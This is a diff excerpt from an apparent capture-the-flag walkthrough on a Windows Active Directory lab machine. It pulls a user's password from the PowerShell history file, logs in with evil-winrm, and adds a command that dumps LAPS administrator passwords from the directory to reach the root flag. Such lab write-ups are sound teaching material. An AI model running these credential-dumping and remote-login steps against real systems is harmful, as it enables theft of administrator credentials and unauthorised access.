@@ -77,3 +77,5 @@ Next we can use the following command `get-psreadlineoption` to get the path to 
 Read the history file and you should be able to get the password for another user
 
 Access the user powershell with this command `└─$ evil-winrm -i 10.10.11.152 -u $USER -p $PASSWORD -S`
+
+Use this command to get the administrator password `Get-ADComputer -Filter * -Properties MS-Mcs-AdmPwd | Where-Object MS-Mcs-AdmPwd -ne $null | FT Name, MS-Mcs-AdmPwd` and once again login with `evil-winrm` to get the root flag.
